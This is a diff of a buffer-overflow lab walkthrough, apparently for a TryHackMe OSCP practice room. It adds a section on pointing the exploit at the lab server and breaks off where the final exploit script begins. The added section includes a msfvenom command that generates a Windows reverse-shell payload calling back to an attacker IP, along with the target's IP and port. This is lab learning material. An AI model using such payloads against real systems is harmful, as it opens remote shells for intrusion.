@@ -713,8 +713,30 @@ except:
 
         - **Your netcat listener should catch a reverse shell!**
         
-            - ![image](https://user-images.githubusercontent.com/94720207/169681296-145d3592-3b28-4929-8dfe-14a94911bae5.png)
+            - ![image](https://user-images.githubusercontent.com/94720207/169709134-a9fbb111-dca8-44c0-b8ac-85a317417eb6.png)
 
+---
+
+### Attacking the real OSCP Server
+
+- This final step is very easy, we only need to point agains the `Real OSCP Server` instead my bare metal Windows 10 PC.
+
+    - To do that, we only need to change the payload from `msfvenom` with another LHOST & LPORT poining my THM-VPN (instead my local  192.168.1.100/24) 
+    
+        - `msfvenom -p windows/shell_reverse_tcp LHOST=10.6.123.13 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x08\x2E\x2F\xA0\xA1" -f c`
+        
+        - ![image](https://user-images.githubusercontent.com/94720207/169681624-15e4e0b2-90c7-4871-95cc-cccdad11002c.png)
+     
+    - Also change the python script to pint the RHOST & RPORT of the OSCP Server (THM machine) 
+    
+        - ip = "10.10.25.92"
+        - port = 1337 
+
+- **Final Script:**
+
+    - **`overflow1_step666_fz3r0_kill_OSCP.py`**
+ 
+```python
 
 
 
